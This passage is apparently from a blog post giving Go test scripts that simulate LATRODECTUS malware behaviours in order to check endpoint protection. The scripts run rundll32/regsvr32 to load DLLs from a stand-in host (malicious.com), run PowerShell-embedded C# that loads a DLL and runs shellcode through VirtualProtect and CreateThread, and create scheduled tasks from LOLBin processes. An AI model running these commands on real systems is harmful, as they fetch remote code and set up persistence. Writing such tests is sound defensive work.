</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution is not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// simulating process execution
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	commands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList &#39;shell32.dll,Control_RunDLL&#39;}&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Start-Process regsvr32.exe -ArgumentList &#39;/s /u shell32.dll&#39;}&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> commands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// DLL loading from suspicious unbacked memory
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	dllLoadingCommands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;rundll32.exe shell32.dll,ShellExec_RunDLL http://malicious.com/malicious.dll&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;regsvr32.exe /s /u http://malicious.com/malicious.dll&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> dllLoadingCommands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// exclusion conditions
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	exclusionCommands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList &#39;--enable-speech-input --enable-media-stream --no-sandbox&#39;}&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Start-Process regsvr32.exe -ArgumentList &#39;--no-sandbox&#39;}&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> exclusionCommands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects network-based behaviours of the malware, like unusual memory execution patterns. it can be thought of as an extension of the previous script.</p>
<h3 id="shellcode-execution-from-low-reputation-module">shellcode execution from low reputation module</h3>
<p><code>LATRODECTUS</code> can execute shellcode from modules that have low or unknown reputations.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;command execution not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">//PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;process execution blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// loading dll with low/unknown rep
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	dllPath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Users\\Public\\lowrep.dll&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe -Command New-Item -Path %s -ItemType File&#34;</span>, dllPath))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// process execution [loading DLL + executing shellcode]
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	commands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Add-Type -TypeDefinition @\&#34;using System;using System.Runtime.InteropServices;public class Win32{[DllImport(\\\&#34;%s\\\&#34;, SetLastError=true)]public static extern IntPtr LoadLibrary(string lpLibFileName);[DllImport(\\\&#34;%s\\\&#34;, SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);[DllImport(\\\&#34;kernel32.dll\\\&#34;)]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);public delegate IntPtr GetShellcode();[DllImport(\\\&#34;kernel32.dll\\\&#34;)]public static extern IntPtr CreateThread(IntPtr, lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);public static void Main(){IntPtr hModule = LoadLibrary(\\\&#34;%s\\\&#34;);IntPtr procAddr = GetProcAddress(hModule, \\\&#34;GetShellcode\\\&#34;);GetShellcode shellcode = (GetShellcode)Marshal.GetDelegateForFunctionPointer(procAddr, typeof(GetShellcode));IntPtr addr = shellcode();uint oldProtect;VirtualProtect(addr, (UIntPtr)0x1000, 0x40, out oldProtect);CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, out _);}}\&#34;@;[Win32]::Main()}&#34;</span>, dllPath, dllPath, dllPath),
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> commands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// exclusions
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	exclusionCommands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList &#39;--no-sandbox&#39;}&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> exclusionCommands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// remove created low reputation DLL file
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	os.<span style="color:#50fa7b">Remove</span>(<span style="color:#f1fa8c">&#34;C:\\Users\\Public\\lowrep.dll&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects shellcode execution that hides behind seemingly benign or low-profile components.</p>
<h3 id="virtualprotect-api-call-from-an-unsigned-dll"><code>VirtualProtect</code> API call from an unsigned DLL</h3>
<p><code>LATRODECTUS</code> uses unsigned DLLs to call <code>VirtualProtect</code>, used to change memory permissions in order to execute code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	executeCommand <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">func</span>(command <span style="color:#8be9fd">string</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] command execution is not available&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[-] failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;[+] successfully executed command: %s&#34;</span>, command))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] process execution was blocked&#34;</span>)
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// loading of an unsigned or untrusted DLL by a trusted binary
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	dllPath <span style="color:#ff79c6">:=</span> <span style="color:#f1fa8c">&#34;C:\\Users\\Public\\unsigned.dll&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">executeCommand</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe -Command New-Item -Path %s -ItemType File&#34;</span>, dllPath))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// process execution that involves loading the DLL and calling VirtualProtect API
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	commands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;powershell.exe -Command Add-Type -TypeDefinition @\&#34;using System;using System.Runtime.InteropServices;public class Win32{[DllImport(\\\&#34;%s\\\&#34;, SetLastError=true)]public static extern IntPtr LoadLibrary(string lpLibFileName);[DllImport(\\\&#34;%s\\\&#34;, SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);[DllImport(\\\&#34;kernel32.dll\\\&#34;)]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);public delegate IntPtr GetShellcode();[DllImport(\\\&#34;kernel32.dll\\\&#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);public static void Main(){IntPtr hModule = LoadLibrary(\\\&#34;%s\\\&#34;);IntPtr procAddr = GetProcAddress(hModule, \\\&#34;GetShellcode\\\&#34;);GetShellcode shellcode = (GetShellcode)Marshal.GetDelegateForFunctionPointer(procAddr, typeof(GetShellcode));IntPtr addr = shellcode();uint oldProtect;VirtualProtect(addr, (UIntPtr)0x1000, 0x40, out oldProtect);CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, out _);}}\&#34;@;[Win32]::Main()&#34;</span>, dllPath, dllPath, dllPath),
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> commands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// exclusion conditions
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	exclusionCommands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList &#39;--no-sandbox&#39;}&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> exclusionCommands {
</span></span><span style="display:flex;"><span>		<span style="color:#50fa7b">executeCommand</span>(command)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">101</span>) <span style="color:#6272a4">// UNPROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">cleanup</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// remove created unsigned DLL file
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	os.<span style="color:#50fa7b">Remove</span>(<span style="color:#f1fa8c">&#34;C:\\Users\\Public\\unsigned.dll&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;[+] Cleanup completed successfully&#34;</span>)
</span></span><span style="display:flex;"><span>	Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">100</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>}
</span></span></code></pre></div><p>the script detects the execution of unsigned DLLs that attemp to modify memory protections. this is a red-flag for many memory-based attacks.</p>
<h3 id="scheduled-task-creation-by-an-unusual-process">scheduled task creation by an unusual process</h3>
<p><code>LATRODECTUS</code> uses unusual processes, like script interpreters, to create scheduled tasks for persistence.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">test</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// commands that simulate scheduled task creation by various processes
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	commands <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;schtasks.exe /create /tn test_task /tr calc.exe /sc daily /f&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	initialAccessProcesses <span style="color:#ff79c6">:=</span> []<span style="color:#8be9fd">string</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;wscript.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;cscript.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;regsvr32.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;mshta.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;rundll32.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;vbc.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msbuild.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;wmic.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;cmstp.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;RegAsm.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;installutil.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;RegSvcs.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;msxsl.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;xwizard.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;csc.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;winword.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;excel.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powerpnt.exe&#34;</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#f1fa8c">&#34;powershell.exe&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> _, process <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> initialAccessProcesses {
</span></span><span style="display:flex;"><span>		<span style="color:#ff79c6">for</span> _, command <span style="color:#ff79c6">:=</span> <span style="color:#ff79c6">range</span> commands {
</span></span><span style="display:flex;"><span>			<span style="color:#6272a4">// initial access process
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			processCmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;start /B %s&#34;</span>, process))
</span></span><span style="display:flex;"><span>			err <span style="color:#ff79c6">:=</span> processCmd.<span style="color:#50fa7b">Start</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to start initial access process: %s&#34;</span>, process))
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			}
</span></span><span style="display:flex;"><span>			time.<span style="color:#50fa7b">Sleep</span>(<span style="color:#bd93f9">2</span><span style="color:#ff79c6">*</span>time.Second)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#6272a4">// check if we can execute commands
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			<span style="color:#ff79c6">if</span> !Endpoint.<span style="color:#50fa7b">IsAvailable</span>(<span style="color:#f1fa8c">&#34;schtasks.exe&#34;</span>) {
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;execution not available&#34;</span>)
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>)
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#6272a4">// execute scheduled task creation command
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			out, err <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, command).<span style="color:#50fa7b">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;failed to execute command: %s&#34;</span>, <span style="color:#8be9fd;font-style:italic">string</span>(out)))
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">1</span>) <span style="color:#6272a4">// ERROR
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			Endpoint.<span style="color:#50fa7b">Say</span>(fmt.<span style="color:#50fa7b">Sprintf</span>(<span style="color:#f1fa8c">&#34;successfully executed command: %s with initial access process: %s&#34;</span>, command, process))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#ff79c6">if</span> strings.<span style="color:#50fa7b">Contains</span>(<span style="color:#8be9fd;font-style:italic">string</span>(out), <span style="color:#f1fa8c">&#34;Access Denied&#34;</span>) {
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Say</span>(<span style="color:#f1fa8c">&#34;execution blocked&#34;</span>)
</span></span><span style="display:flex;"><span>				Endpoint.<span style="color:#50fa7b">Stop</span>(<span style="color:#bd93f9">126</span>) <span style="color:#6272a4">// PROTECTED
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>			}
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#6272a4">// execute unsigned/untrusted executable
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	untrustedCmd <span style="color:#ff79c6">:=</span> exec.<span style="color:#50fa7b">Command</span>(<span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#f1fa8c">&#34;/C&#34;</span>, <span style="color:#f1fa8c">&#34;schtasks.exe /create /tn test_task_untrusted /tr calc.exe /sc daily /f&#34;</span>)
